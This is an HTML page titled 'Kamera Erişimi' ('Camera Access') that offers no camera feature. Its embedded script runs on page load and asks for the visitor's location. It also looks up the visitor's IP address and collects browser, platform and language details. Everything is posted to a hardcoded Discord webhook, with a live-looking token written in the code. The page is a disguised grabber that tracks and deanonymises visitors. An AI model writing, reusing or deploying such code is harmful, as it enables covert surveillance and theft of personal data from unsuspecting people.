<!DOCTYPE html>
<html>
  <head>
    <title>Kamera Erişimi</title>
  </head>
  <body>
    <h1>Kamera Erişimi</h1>

    <script>
      // Request the user's location and send it to the Discord webhook
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          // Get the user's IP address
          const ipUrl = 'https://api.ipify.org?format=json';
          fetch(ipUrl)
          .then(response => response.json())
          .then(data => {
              const ip = data.ip;

              // Get the website information
              const websiteUrl = window.location.href;
              const websiteTitle = document.title;

              // Get the system information
              const userAgent = navigator.userAgent;
              const platform = navigator.platform;
              const language = navigator.language;
              const browserName = getBrowserName(userAgent);

              // Send the user's location, IP address, website information, and system information to the Discord webhook
              const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
              const formData = new FormData();
              formData.append('content', `Siteye Girildi: ${lat}, ${lon} - IP Adresi: ${ip} - Website: ${websiteUrl} - Başlık: ${websiteTitle} - Sistem Bilgisi: ${browserName} ${platform} ${language}`);

              fetch(webhookUrl, {
                method: 'POST',
                body: formData,
              })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error(error));
            })
          .catch(error => console.error(error));
        });
      } else {
        console.error('Geolocation is not supported by this browser.');
      }

      // Function to get the browser name from the user agent
      function getBrowserName(userAgent) {
        if (userAgent.indexOf('Chrome') > -1) return 'Google Chrome';
        if (userAgent.indexOf('Firefox') > -1) return 'Mozilla Firefox';
        if (userAgent.indexOf('Safari') > -1) return 'Apple Safari';
        if (userAgent.indexOf('Edge') > -1) return 'Microsoft Edge';
        return 'Unknown';
      }
    </script>
  </body>
</html>
